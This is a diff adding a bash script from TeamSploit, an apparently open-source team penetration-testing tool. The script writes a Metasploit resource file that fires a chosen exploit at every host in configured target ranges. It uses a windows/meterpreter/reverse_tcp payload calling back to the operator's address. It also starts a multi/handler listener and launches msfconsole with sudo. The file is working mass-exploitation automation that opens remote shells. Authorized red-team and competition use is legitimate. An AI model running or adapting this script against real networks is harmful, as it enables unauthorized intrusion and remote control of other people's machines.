@@ -1,0 +1,50 @@
+#!/bin/bash
+
+#       TeamSploit - Pen Testing With Friends
+#       Copyrighted:  Justin M. Wray (wray.justin@gmail.com)
+#       Special Thanks:  Team ICF (Twitter:@ICFRedTeam)
+#
+#    This program is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU General Public License as published by
+#    the Free Software Foundation, either version 3 of the License, or
+#    (at your option) any later version.
+#
+#    This program is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU General Public License for more details.
+#
+#    You should have received a copy of the GNU General Public License
+#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
+
+source teamsploit.conf
+
+if [[ -z $1 || -z $2 || -z $3 ]]; then exit; fi
+
+ORIG=$1
+TARGET_OCT=$2
+EXPLOIT=$3
+
+TARGETS=`echo $TS_TARGET_RANGES | sed -e 's/;/\n/g' | sed -e 's/$/.'$TARGET_OCT'/g' | grep -v $ORIG`
+
+RANDRC=/tmp/$RANDOM.autotarget.rc
+
+echo "set Prompt ts-autotarget" > $RANDRC
+echo "load autopost_notrg" >> $RANDRC
+echo "setg DisablePayloadHandler true" >> $RANDRC
+echo "setg AutoLoadStdapi false" >> $RANDRC
+echo "set ExitOnSession false" >> .teamsploit.rc.listener
+echo "use exploit/multi/handler" >> .teamsploit.rc.listener
+echo "setg LHOST $TS_MY_IP" >> .teamsploit.rc.listener
+echo "set LPORT $TS_AUTO_TARGET_PORT" >> .teamsploit.rc.listener
+echo "exploit -z -j" >> .teamsploit.rc.listener
+echo "use $EXPLOIT" >> $RANDRC
+echo "setg PAYLOAD windows/meterpreter/reverse_tcp" >> $RANDRC
+echo "setg LHOST $TS_MY_IP" >> $RANDRC
+
+for i in $TARGETS; do
+	echo "set RHOST $i" >> $RANDRC
+	echo "exploit -z -j" >> $RANDRC
+done
+
+gnome-terminal -e 'sudo msfconsole -m .msf -r '$RANDRC -t 'Metasploit: Auto Target (.'$TARGET_OCT')'
